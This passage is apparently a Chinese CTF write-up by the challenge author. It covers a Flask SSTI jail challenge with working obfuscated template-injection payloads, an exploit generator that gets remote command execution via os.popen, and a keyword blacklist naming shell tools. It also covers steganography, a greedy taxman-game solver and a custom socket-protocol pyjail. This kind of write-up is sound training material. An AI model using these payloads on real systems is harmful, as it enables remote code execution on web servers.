GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%for%0ai%0ain%0arequest.endpoint|slice(1)%}{%set%0adat=i.9~i.2~i.12~i.2%}{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}{%set%0aa0%0a=%0ak.16~k.31~k.31~k.27~k.24~k.18~k.16~k.35~k.24~k.30~k.29%}{%set%0aa1%0a=%0ak.2~k.2~k.22~k.27~k.30~k.17~k.16~k.27~k.34~k.2~k.2%}{%set%0aa2%0a=%0ak.2~k.2~k.22~k.20~k.35~k.24~k.35~k.20~k.28~k.2~k.2%}{%set%0aa3%0a=%0ak.2~k.2~k.17~k.36~k.24~k.27~k.35~k.24~k.29~k.34~k.2~k.2%}{%set%0aa4%0a=%0ak.2~k.2~k.24~k.28~k.31~k.30~k.33~k.35~k.2~k.2%}{%set%0aa5%0a=%0ak.34~k.36~k.17~k.31~k.33~k.30~k.18~k.20~k.34~k.34%}{%set%0aa6%0a=%0ak.30~k.34%}{%set%0aa7%0a=%0ak.24~k.28~k.31~k.30~k.33~k.35~k.27~k.24~k.17%}{%set%0aa8%0a=%0ak.33~k.20~k.27~k.30~k.16~k.19%}{%set%0aa9%0a=%0ak.31~k.30~k.31~k.20~k.29%}{%set%0aa10%0a=%0ak.38~k.23~k.30~k.16~k.28~k.24%}{%set%0aa11%0a=%0ak.33~k.20~k.16~k.19%}{%set%0asub=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a5)%}{%set%0aso=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a6)%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(sub))%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(so))%}{%print(so|attr(a9)(a10)|attr(a11)())%}{%print(so|attr(a9)(a10)|attr(a11)())%}{%endfor%}{%endfor%} HTTP/1.1
Host: XXX
sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 69

_ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/
```

下载服务器上的`/flag_h3r3`文件，可以发现是一个MP3音频。想到deepsound隐写。

![](/images/migrated/18730353/09.png)

在txt文档中读取到flag

![](/images/migrated/18730353/10.png)

`flag{N0w_y0u_sEEEEEEEEEEEEEEE_m3!!!!!!}`

不要过度依赖工具。所谓的“神器”在抢血的时候用用得了。只有真正掌握了原理才能“通杀题目”。最后混了个musc主要是为了有趣一点，不是为了让师傅们赤石，原谅我吧www。

# WEB-Now you see me 2

## 出题灵感

我真的没有活了（哭）。所以就把Now you see me 1的回显去了，再出了一个revenge。

## 题解

```
# YOU FOUND ME ;)
# -*- encoding: utf-8 -*-
'''
@File    :   src.py
@Time    :   2025/03/29 01:20:49
@Author  :   LamentXU 
'''
# DNS config: No reversing shells for you.
import flask
import time, random, traceback
import flask
import sys
import traceback
enable_hook =  False
counter = 0
def audit_checker(event,args):
    global counter
    if enable_hook:
        if event in ["exec", "compile"]:
            counter += 1
            if counter > 4:
                raise RuntimeError(event)
lock_within = [
    "debug", "form", "args", "values", 
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application", 
    'data', 'url' ,'\'', '"', 
    "getattr", "_", "{{", "}}", 
    "[", "]", "\\", "/","self", 
    "lipsum", "cycler", "joiner", "namespace", 
    "init", "dir", "join", "decode", 
    "batch", "first", "last" , 
    " ","dict","list","g.",
    "os", "subprocess",
    "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\\u", "pop", "referer",
    "Isn't that enough? Isn't that enough."] 
# lock_within = []
allowed_endpoint = ["static", "index", "r3al_ins1de_th0ught"]
app = flask.Flask(__name__)
@app.route('/')
def index():
    return 'try /H3dden_route'
@app.route('/H3dden_route')
def r3al_ins1de_th0ught():
    quote = flask.request.args.get('spell')
    if quote:
        try:
            if quote.startswith("fly-"):
                for i in lock_within:
                    if i in quote:
                        print(i)
                        return "wouldn't it be easier to give in?"
                time.sleep(random.randint(10, 30)/10) # No time based injections.
                flask.render_template_string('Let-the-magic-{#'+f'{quote}'+'#}')
                print("Registered endpoints and functions:")
                for endpoint, func in app.view_functions.items():
                    if endpoint not in allowed_endpoint:
                        del func # No creating backdoor functions & endpoints.
                        return f'What are you doing with {endpoint} hacker?'
                    
                return 'Let the true magic begin!'
            else:
                return 'My inside world is always hidden.'
        except Exception as e:
            return traceback.format_exc()
    else:
        return 'Welcome to Hidden_route!'

if __name__ == '__main__':
    import os
    try:
        import _posixsubprocess
        del _posixsubprocess.fork_exec
    except:
        pass
    import subprocess
    del os.popen
    del os.system
    del subprocess.Popen
    del subprocess.call
    del subprocess.run
    del subprocess.check_output
    del subprocess.getoutput
    del subprocess.check_call
    del subprocess.getstatusoutput
    del subprocess.PIPE
    del subprocess.STDOUT
    del subprocess.CalledProcessError
    del subprocess.TimeoutExpired
    del subprocess.SubprocessError
    sys.addaudithook(audit_checker)
    app.run(debug=False, host='0.0.0.0', port=5000)
```

其实是差不多的。

### 请求头回显

这里限制了时间盲注，弹shell，内存马啥的，唯独没有限制请求头回显。

可以很容易想到这个基础的payload：

```
{%print(g|attr('pop')|attr('__globals__')|attr('get')('__builtins__')|attr('get')('setattr')(g|attr('pop')|attr('__globals__')|attr('get')('sys')|attr('modules')|attr('get')('werkzeug')|attr('serving')|attr('WSGIRequestHandler'),'server_version',g|attr('pop')|attr('__globals__')|attr('get')('__builtins__')|attr('get')('__import__')('os')|attr('popen')('"""+cmd+"""')|attr('read')()))%}
```

随后使用上一题一模一样的策略打就行

脚本：

```
# -*- encoding: utf-8 -*-
'''
@File    :   exploit.py
@Time    :   2025/01/27 17:46:11
@Author  :   LamentXU 
'''

# Please fly little dreams.

import re
payload = []
def generate_rce_command(cmd):
    global payload
    payloadstr = """{%set%0asub=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('subprocess')%}{%set%0aso=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(sub))%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(so))%}{%print(g|attr('pop')|attr('__globals__')|attr('get')('__builtins__')|attr('get')('setattr')(g|attr('pop')|attr('__globals__')|attr('get')('sys')|attr('modules')|attr('get')('werkzeug')|attr('serving')|attr('WSGIRequestHandler'),'server_version',g|attr('pop')|attr('__globals__')|attr('get')('__builtins__')|attr('get')('__import__')('os')|attr('popen')('"""+cmd+"""')|attr('read')()))%}"""

    required_encoding = re.findall('\'([a-z0-9_ /\.]+)\'', payloadstr)
    # print(required_encoding)
    required_encoding.append('WSGIRequestHandler')
    offset_a = 16
    offset_0 = 6
    offset_A = 42
    encoded_payloads = {}

    arg_count = 0
    for i in required_encoding:
        print(i)
        if i not in encoded_payloads:
            p = []
            for j in i:
                if j == '_':
                    p.append('k.2')
                elif j == ' ':
                    p.append('k.3')
                elif j == '.':
                    p.append('k.4')
                elif j == '-':
                    p.append('k.5')
                elif j.isnumeric():
                    a = str(ord(j)-ord('0')+offset_0)
                    p.append(f'k.{a}')
                elif j == '/':
                    p.append('k.68')
                elif ord(j) >= ord('a') and ord(j) <= ord('z'):
                    a = str(ord(j)-ord('a')+offset_a)
                    p.append(f'k.{a}')
                elif ord(j) >= ord('A') and ord(j) <= ord('Z'):
                    a = str(ord(j)-ord('A')+offset_A)
                    p.append(f'k.{a}')
            arg_name = f'a{arg_count}'
            encoded_arg = '{%' + '%0a'.join(['set', arg_name , '=', '~'.join(p)]) + '%}'
            encoded_payloads[i] = (arg_name, encoded_arg)
            arg_count+=1
            payload.append(encoded_arg)
    # print(encoded_payloads)
    fully_encoded_payload = payloadstr
    for i in encoded_payloads.keys():
        if i in fully_encoded_payload:
            fully_encoded_payload = fully_encoded_payload.replace("'"+ i +"'", encoded_payloads[i][0])
    # print(fully_encoded_payload)
    payload.append(fully_encoded_payload)
command = "whoami"
full_payload = '''{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('" + cmd + "')|attr('read')())%}'''
endpoint = "r3al_ins1de_thought"
payload.append(r'{%for%0ai%0ain%0arequest.endpoint|slice(1)%}')
word_data = ''
for i in 'data':
    word_data += 'i.' + str(endpoint.find(i)) + '~'
word_data = word_data[:-1] # delete the last '~'
# Now we have "data"
print("data: "+word_data)
payload.append(r'{%set%0adat='+word_data+'%}')
payload.append(r'{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}')
generate_rce_command(command)
# payload.append(r'{%print(j)%}')
# Here we use the "data" to construct the payload
print('request body: _ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/')
# use chr() to convert the number to character
# hiahiahia~ Now we get all of the charset, SSTI go go go!

payload.append(r'{%endfor%}')
payload.append(r'{%endfor%}')
output = ''.join(payload)

print(r"fly-%23}"+output)
```

![](/images/migrated/18730353/11.png)

可以看到成功执行whoami

payload：

```
GET /H3dden_route?spell=fly-%23}{%for%0ai%0ain%0arequest.endpoint|slice(1)%}{%set%0adat=i.9~i.2~i.12~i.2%}{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}{%set%0aa0%0a=%0ak.16~k.31~k.31~k.27~k.24~k.18~k.16~k.35~k.24~k.30~k.29%}{%set%0aa1%0a=%0ak.2~k.2~k.22~k.27~k.30~k.17~k.16~k.27~k.34~k.2~k.2%}{%set%0aa2%0a=%0ak.2~k.2~k.22~k.20~k.35~k.24~k.35~k.20~k.28~k.2~k.2%}{%set%0aa3%0a=%0ak.2~k.2~k.17~k.36~k.24~k.27~k.35~k.24~k.29~k.34~k.2~k.2%}{%set%0aa4%0a=%0ak.2~k.2~k.24~k.28~k.31~k.30~k.33~k.35~k.2~k.2%}{%set%0aa5%0a=%0ak.34~k.36~k.17~k.31~k.33~k.30~k.18~k.20~k.34~k.34%}{%set%0aa6%0a=%0ak.30~k.34%}{%set%0aa7%0a=%0ak.24~k.28~k.31~k.30~k.33~k.35~k.27~k.24~k.17%}{%set%0aa8%0a=%0ak.33~k.20~k.27~k.30~k.16~k.19%}{%set%0aa9%0a=%0ak.31~k.30~k.31%}{%set%0aa10%0a=%0ak.22~k.20~k.35%}{%set%0aa11%0a=%0ak.34~k.20~k.35~k.16~k.35~k.35~k.33%}{%set%0aa12%0a=%0ak.34~k.40~k.34%}{%set%0aa13%0a=%0ak.28~k.30~k.19~k.36~k.27~k.20~k.34%}{%set%0aa14%0a=%0ak.38~k.20~k.33~k.26~k.41~k.20~k.36~k.22%}{%set%0aa15%0a=%0ak.34~k.20~k.33~k.37~k.24~k.29~k.22%}{%set%0aa16%0a=%0ak.34~k.20~k.33~k.37~k.20~k.33~k.2~k.37~k.20~k.33~k.34~k.24~k.30~k.29%}{%set%0aa17%0a=%0ak.31~k.30~k.31~k.20~k.29%}{%set%0aa18%0a=%0ak.38~k.23~k.30~k.16~k.28~k.24%}{%set%0aa19%0a=%0ak.33~k.20~k.16~k.19%}{%set%0aa20%0a=%0ak.64~k.60~k.48~k.50~k.59~k.20~k.32~k.36~k.20~k.34~k.35~k.49~k.16~k.29~k.19~k.27~k.20~k.33%}{%set%0asub=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a5)%}{%set%0aso=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a6)%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(sub))%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(so))%}{%print(g|attr(a9)|attr(a1)|attr(a10)(a3)|attr(a10)(a11)(g|attr(a9)|attr(a1)|attr(a10)(a12)|attr(a13)|attr(a10)(a14)|attr(a15)|attr(a20),a16,g|attr(a9)|attr(a1)|attr(a10)(a3)|attr(a10)(a4)(a6)|attr(a17)(a18)|attr(a19)()))%}{%endfor%}{%endfor%} HTTP/1.1
Host: 127.0.0.1:5000
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="133", "Not(A:Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 67

_ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/
```

随后下载flag。010看到PNG头。

### LSB隐写

最后其实就是一个最基础的LSB。甚至可以以用在线的网站解

[https://toolgg.com/image-decoder.html](https://toolgg.com/image-decoder.html)

![](/images/migrated/18730353/12.png)

`flag{__M@g1c1@ans_M@stering_M@g1c__}`

又水完一题。。。这里本来想禁止请求头回显，把随机延时放到render后面来打内存马条件竞争的。但是发现他娘的请求头回显根本禁止不死（我太菜了）因此直接摆烂了。

# MISC-greedymen

## 出题灵感

这题的其实源自于一个经典的数字游戏：taxman game。感兴趣的CTFER可以去看看。

对于这个游戏的最优解的争论就没停过，但是有一个很基本的思路能破解这个谜题，就是贪心算法。

这题是黑盒题。我把源码贴在这里：

```
import math
import random
from secret import level1,level2,level3
def menu():
    print("1.Play")
    print("2.Rules")
    print("3.Quit")
def rule():
    print("There are 3 levels, level 1/2/3 has number 1 to 50/100/200 on board to choose from")
    print("Each number you choose, you get the corresponding points")
    print("However, your opponent will choose all the factors of the number you choose, and get the points of each factor")
    print("You can not choose numbers that are already assigned to a player")
    print("You are only allow to choose the number if it has at least one factor not choosen")
    print("If you can't choose anymore, the rest of the board goes to your opponent")
    print(f"To make the challenge harder, there is a counter that starts with {len(level1)}/{len(level2)}/{len(level3)} in level 1/2/3, each time you choose a number, the counter decreases by 1")
    print("When it reaches 0, and the game will end, and the unassigned numbers will go to your opponent")
    print("The challenge is always solvable")
    print("Player with highest score wins")
    print("Good Luck!")

def choosable(num):
    for i in range(1,len(num)):
        if num[i]==0:
            for j in range(1,i//2+1):
                if num[j]==0 and i%j==0:
                    return True 

    return False

def can(arr,num):
    for j in range(1,num//2+1):
        if arr[j]==0 and num%j==0:
            return True
    return False

def game(level):
    player=0
    opp=0
    num=[0 for _ in range(level+1)]
    print("Level",level)
    if level==50:
        counter = len(level1)
    elif level==100:
        counter = len(level2)
    elif level==200:
        counter = len(level3)
    while choosable(num):
        num_list = [i for i in range(1,level+1) if num[i]==0]
        print("Unassigned Numbers:",num_list)
        print("Counter:", counter)
        print("Your Score:", player)
        print("Opponent Score:", opp)
        try:
            choice=int(input("Choose a Number:"))
        except ValueError:
            print("Invalid Input!")
            continue
        if choice<=0 or choice>level:
            print("BAD CHOICE!")
        elif num[choice]==0 and can(num,choice):
            num[choice]=1
            player+=choice
            for i in range(1, choice//2+1):
                if num[i] == 0 and choice % i == 0:
                    num[i] = 1
                    opp += i
            counter -= 1
            if counter == 0:
                break
        else:
            if not num[choice]==0:
                print(f"BAD CHOICE! The number {choice} has already been assigned!")
            else:
                print(f"BAD CHOICE! All factors of the number {choice} has been assigned!")
    for i in range(1,level+1):
        if num[i]==0:
            num[i]= 1
            opp+=i
    print("Your Score:", player)
    print("Opponent Score:", opp)
    if player>opp:
        print("You Win!")
        return True
    else:
        print("You Lost!")
        return False

print("Welcome to the Greedy Game")
print("Your goal is to be as greedy as possible")
while True:
    menu()
    choice=int(input())
    if choice==1:
        flag=True
        for i in range(3):
            print("Level "+str(i+1)+"/"+"3",25*i**2+25*i+50,"Numbers")
            if not game(25*i**2+25*i+50):
                flag=False
                break
        if flag:
            with open('flag.txt', 'r') as f:
                print("Congratulations!, Here's Your Flag " + f.read())
            exit()
    elif choice==2:
        rule()
    elif choice==3:
        exit()
    else:
        print("HEY!")
```

其中secret.py里的level1/2/3即为答案。

## 题解

这题我感觉其实也可以去搜，假如能搜到taxman game其实就差不多了（我感觉网上应该还是有破解taxman game的脚本的），题目名称给了提示是贪心算法，意识到这个之后其实就不难（就算没意识到题目的提示也应该能想到）。

exp：

```
from pwn import *
io = process(['python', 'chal.py']) # 换成远程靶机
context.log_level = 'debug'
io.recvuntil('3.Quit')
io.sendline('1')

def get_divisors(n, available_numbers):
    divisors = [d for d in range(1, n) if n % d == 0 and d in available_numbers]
    return divisors
def taxman_game(max_num):
    ans=[]
    available_numbers = set(range(1, max_num + 1))
    player_score = 0
    taxman_score = 0

    while available_numbers:

        best_move = None
        best_divisors = []
        best_difference = float('-inf')
        for number in available_numbers:
            divisors = get_divisors(number, available_numbers)
            if not divisors:
                continue
            divisor_sum = sum(divisors)
            difference = number - divisor_sum

            if difference > best_difference:
                best_move = number
                best_divisors = divisors
                best_difference = difference
        if best_move is None:
            break
        player_score += best_move
        taxman_score += sum(best_divisors)
        available_numbers.remove(best_move)
        for divisor in best_divisors:
            available_numbers.remove(divisor)
        ans.append(best_move)
    taxman_score += sum(available_numbers)
    available_numbers.clear()
    return ans
def solve(num):
    ans = taxman_game(num)
    for i in ans:
        io.recvuntil('Choose a Number:')
        io.sendline(str(i))
    io.recvuntil('You Win!')
solve(50)
solve(100)
solve(200)
```

运行拿flag

![](/images/migrated/18730353/13.png)

`flag{Greed, is......key of the life.}`

这题还是挺送分的。光是搜题目规则按照musc选手的能力就应该能给我题目原型扒拉出来。然后随便找github或者deepseek秒杀。如果是手搓的贪心那我敬你是条汉子（bushi）

# MISC-Lament Jail

## 出题灵感

套接字部分来源于我初中的一个小项目，用来简化套接字编程的。后面的沙箱应该是直接奔上了最难考点，就是python uaf。但是网上有现成的脚本可以抄，所以只要意识到是uaf之后就不算难。整体难度中等，作为杂项的压轴题怎么说都有点简单。

## 题解

可以看到这题实际上就是定义了一个套接字的传输协议，并利用这个协议进行交流。在发出几个信息之后，允许用户上传一个文件，并在audithook沙箱里执行这个文件，有回显（仁至义尽了www），只要运行到/bin/rf就有flag。核心代码如下：

```
def main():
    Sock = SimpleTCP(password='LetsLament')
    Sock.s.bind(('0.0.0.0', 13337))
    Sock.s.listen(5) 
    while True:
        _ = Sock.accept()     
        Sock.send('Hello, THE flag speaking.')
        Sock.send('I will not let you to control Lament Jail forever.')
        Sock.send('But, my friend LamentXU has to control it, as he will rescue me out of this jail.')
        Sock.send('So here is the pyJail I build. Only LamentXU knows how to break it.')    
        a = Sock.recvfile().decode()
        waf = '''
import sys
def audit_checker(event,args):
    if not 'id' in event:
    	raise RuntimeError
sys.addaudithook(audit_checker)

'''
        content = waf + a
        name = uuid4().hex+'.py'
        with open(name, 'w') as f:
            f.write(content)
        try:
            cmd = ["python3", name]
            p = Popen(cmd, stdout=PIPE, stderr=PIPE)
            for line in iter(p.stdout.readline, b''):
                Sock.send(line.decode('utf-8').strip())
            p.wait()
            Sock.send('Done, BYE.')
        except:
            Sock.send('Error.')
        finally:
            Sock.s.close()
        remove(name)
if __name__ == '__main__':
    while True:
        try:
            main()
        except:
            pass
```

### socket编程——密钥交换

首先看socket部分，这里服务端约等于是自己定义了一套通讯协议。我们的首要目标是实现一个与服务端配套的客户端。

先看init

```
    def __init__(self, family: AddressFamily = AF_INET, type: SocketKind = SOCK_STREAM
                 , proto: int = -1, fileno: int = None, is_encrypted: bool = True, AES_key: bytes = None, password: bytes = None) -> None:
        '''
        is_encrypted: use encrypted connection, only for server
        AES_key: use a fixed AES_key, None for random, must be 16 bytes, only for server
        password: A fixed password is acquired from the client (must smaller than be 100 bytes), if wrong, the connection will be closed
            if password is set in server, every time a client connect, the client must send the same password back to the server to accept.
            if password is set in client, every time you connect to the server, the password will be sent to the server to verify.
            if password is None, no password will be used.
        self.Default_message_len: if in encrypted mode, the value must be a multiple of self.BLOCK_SIZE
        MAKE SURE THE DEFAULT_MESSAGE_LEN OF BOTH SERVER AND CLIENT ARE SAME, Or it could be a hassle
        '''
        
        self.BLOCK_SIZE = 16 # block size of padding text which will be encrypted by AES
        # the block size must be a mutiple of 8
        self.default_encoder = 'utf8'  # the default encoder used in send and recv when the message is not bytes
        if is_encrypted:
            if AES_key == None:
                self.key = get_random_bytes(16)  # generate 16 bytes AES code
            else:
                self.key = AES_key #TODO check the input 
            self.cipher_aes = AES.new(self.key, AES.MODE_ECB)
        else:
            self.key, self.cipher_aes = None, None
        self.default_message_len = 1024 # length of some basic message, it's best not to go below 1024 bytes
        if password == None:
            self.password = None
        else:
            self.password = self.turn_to_bytes(password)
            if len(password) > 100:
                raise ValueError('The password is too long, it must be smaller than 100 bytes')
        self.s = socket(family, type, proto, fileno)  # main socket
```

可以看到存在密码功能，在题目里也能看到密码`LetsLament`

随后看accept函数

```
def accept(self) -> tuple:
        '''
        Accept with information exchange and key exchange, return the address of the client
        if the password from client is wrong or not set, raise PasswordError
        '''
        self.s, address = self.s.accept()
        if self.key == None:
            is_encrypted = False
        else:
            is_encrypted = True
        if self.password == None:
            has_password = False
        else:
            has_password = True
        info_dict = {
            'is_encrypted' : is_encrypted,
            'has_password' : has_password}
        info_dict = dumps(info_dict).encode(encoding=self.default_encoder)
        self.s.send(self.turn_to_bytes(len(info_dict)))
        self.s.send(info_dict)
        if has_password:
            password_length = self.unpadding_packets(self.s.recv(3), -1)
            if not password_length:
                self.s.close()
                raise PasswordError(f'The client {address} does not send the password, the connection will be closed')
            recv_password = self.s.recv(int(password_length.decode(encoding=self.default_encoder))) # the first byte is whether the password is aquired(1) or not(0), the rest is the password, the password is padded to 100 bytes
            if recv_password != self.password or recv_password[0] == b'0':
                self.s.send(b'0')
                self.s.close()
                raise PasswordError(f'The password {recv_password} is wrong, the connection from {address} will be closed, you can restart the accept() function or put it in a while loop to keep accepting')
            else:
                self.s.send(b'1')
        if is_encrypted:
            public_key = self.s.recv(450)
            rsa_public_key = RSA.import_key(public_key)
            cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
            encrypted_aes_key = cipher_rsa.encrypt(self.key)
            self.s.send(encrypted_aes_key)
        # TODO
        return address
```

首先这里很明显构造了一个信息字典，将字典转为bytes。然后传给客户端（在这之前还传了一个包表示长度）。这个字典里有两个参数，分别是是否使用加密通讯和是否需要连接密码（显然在这道题里都是的）。随后接受客户端发来的密码并验证，如果正确返回1，错误返回0。在之后进行密钥交换。

我们先实现密码传输的协议。其实那个信息字典在这题里是固定的，根本没用。我们直接糊弄过去就好了。主要是在info\_dict之后发送我们的密码。

实现如下：

```
 def connect(self, Address: tuple) -> None:
        '''
        Connect with information exchange and key exchange
        if the password from client is wrong or not set, raise PasswordError
        '''
        self.s.connect(Address)
        info_dict_len = int(self.s.recv(2).decode(encoding=self.default_encoder))
        info_dict = self.s.recv(info_dict_len).decode(encoding=self.default_encoder)
        info = loads(info_dict)
        if info['has_password'] == True:
            if self.password == None:
                self.s.send(b'   ') # send three space to tell the server that the password is not set
                self.s.close()
                raise PasswordError('The server requires a password, please set it in the client or server')
            self.s.send(str(len(self.password)).encode(encoding=self.default_encoder))
            self.s.send(self.password)
            password_confirm = self.s.recv(1)
            if password_confirm != b'1':
                self.s.close()
                raise PasswordError('The password is wrong, the connection will be closed')
```

随后我们来看密钥交换的逻辑：

```
            public_key = self.s.recv(450)
            rsa_public_key = RSA.import_key(public_key)
            cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
            encrypted_aes_key = cipher_rsa.encrypt(self.key)
            self.s.send(encrypted_aes_key)
```

首先它让客户端生成一对临时的RSA密钥，并将公钥发送给服务端。服务端使用这个临时的公钥加密一个AES的密钥，接下来发送这个密钥给客户端，客户端拿到这个加密过的AES密钥后使用RSA的私钥进行解密。随后使用AES密钥加密通讯，完成密钥交换。

由此我们实现：

```
        if info['is_encrypted'] == True:
            tmp_key = RSA.generate(2048)
            private_key = tmp_key.export_key()
            public_key = tmp_key.publickey().export_key()
            self.s.send(public_key)
            rsa_private_key = RSA.import_key(private_key)
            cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
            encrypted_aes = self.s.recv(256).rstrip(b"\x00")
            self.key = cipher_rsa.decrypt(encrypted_aes)
            self.cipher_aes = AES.new(self.key, AES.MODE_ECB)
        else:
            self.key, self.cipher_aes = None, None
```

总的connect函数：

```
    def connect(self, Address: tuple) -> None:
        '''
        Connect with information exchange and key exchange
        if the password from client is wrong or not set, raise PasswordError
        '''
        self.s.connect(Address)
        info_dict_len = int(self.s.recv(2).decode(encoding=self.default_encoder))
        info_dict = self.s.recv(info_dict_len).decode(encoding=self.default_encoder)
        info = loads(info_dict)
        if info['has_password'] == True:
            if self.password == None:
                self.s.send(b'   ') # send three space to tell the server that the password is not set
                self.s.close()
                raise PasswordError('The server requires a password, please set it in the client or server')
            self.s.send(str(len(self.password)).encode(encoding=self.default_encoder))
            self.s.send(self.password)
            password_confirm = self.s.recv(1)
            if password_confirm != b'1':
                self.s.close()
                raise PasswordError('The password is wrong, the connection will be closed')
        if info['is_encrypted'] == True:
            tmp_key = RSA.generate(2048)
            private_key = tmp_key.export_key()
            public_key = tmp_key.publickey().export_key()
            self.s.send(public_key)
            rsa_private_key = RSA.import_key(private_key)
            cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
            encrypted_aes = self.s.recv(256).rstrip(b"\x00")
            self.key = cipher_rsa.decrypt(encrypted_aes)
            self.cipher_aes = AES.new(self.key, AES.MODE_ECB)
        else:
            self.key, self.cipher_aes = None, None
```

至此，我们完成了密钥的交换，拿到了服务器的AES密钥。接下来，我们实现加密通讯的收发包部分。

### socket编程——基本收发包

可以看到服务器使用自定义的send和recvfile函数进行信息传输。我们来查看代码：

**针对send实现recv**

```
    def send(self, message) -> None:
        '''
        Send a message with the socket
        can accept bytes, str, int, etc.
        The data should not be larger than 9999 bytes
        It can be used at any time 
        Use self.send_large and recv_large if you want to send a big message
        '''
        message = self.turn_to_bytes(message)
        try:
            message_len = self.padding_packets(
                self.turn_to_bytes(len(message)), target_length=4)[0]
        except MessageLengthError:
            raise MessageLengthError(
                'The length of message is longer than 9999 bytes({} bytes), please use send_large instead'.format(str(len(message))))
        self._send(message_len)
        self._send(message)
```

跟进这个`_send`函数

```
    def _send(self, message: bytes) -> None:
        '''
        The basic method to encrypt and send data 
        MUST BE A MUTIPLE OF THE BLOCK SIZE IN ENCRYPTED MODE
        '''
        if self.cipher_aes != None:
            output_message = self.cipher_aes.encrypt(self.pad_packets_to_mutiple(message, self.BLOCK_SIZE))
            # plainmessage = unpad(self.cipher_aes.decrypt(output_message), self.BLOCK_SIZE)
        else:
            output_message = message
        self.s.send(output_message)  # The TCP mode
```

可以看到就是一个基本的padding+AES加密。而`send`函数就是调用两次`_send`，将需要发送的信息的长度和内容分别pad，然后加密发出。由此，我们实现`recv`函数。注意到已经有实现好的`_recv`函数了，如下

```
    def _recv(self, length: int) -> bytes:
        '''
        The basic method to decrypt and recv data
        '''
        if self.cipher_aes != None:
            if length % 16 == 0:
                length += 16
            length = (length + self.BLOCK_SIZE-1) // self.BLOCK_SIZE * self.BLOCK_SIZE # round up to multiple of 16
            message = self.s.recv(length)
            message = self.cipher_aes.decrypt(message)
            message = self.unpad_packets_to_mutiple(message, self.BLOCK_SIZE)
        else:
            message = self.s.recv(length)
        return message
```

因此，我们的`recv`只要调用两次`_recv`即可。第一次由于是长度，所以为4字节。第二次就是`第一次接收的内容`个字节

实现如下：

```
    def recv(self, is_decode: bool = True):
        '''
        The return type can be bytes or string
        The method to recv message WHICH IS SENT BY self.send
        is_decode : decode the message with {self.default_encoder}
        '''
        message_len = self._recv(4).rstrip()
        message_len = int(message_len.decode(encoding=self.default_encoder))
        message = self._recv(message_len)
        if is_decode:
            message = message.decode(encoding=self.default_encoder)
        return message
```

可以看到我们已经可以正常接收信息了

![](/images/migrated/18730353/14.png)

**针对recvfile实现sendfile**

审计`recvfile`函数，如下：

```
    def recvfile(self) -> bytes:
        '''
        Only receive file sent using self.send_largefile
        '''
        output = b''
        while True:
            a = self.recv_large(is_decode=False)
            if a != 'EOF'.encode(encoding=self.default_encoder):
                output += a
            else:
                break
        return output
```

其逻辑就是一个循环接收包，直到EOF为止，每个包由`recv_large`发送。跟进

```
    def recv_large(self, is_decode: bool = True):
        '''
        The return type can be bytes or string
        The method to recv message WHICH IS SENT BY self.send_large
        is_decode : decode the message with {self.default_encoder}
        '''
        message_listlen = self._recv(self.default_message_len).decode(
            encoding=self.default_encoder).rstrip()
        message_listlen = int(message_listlen)
        message = b''
        for i in range(0, message_listlen):
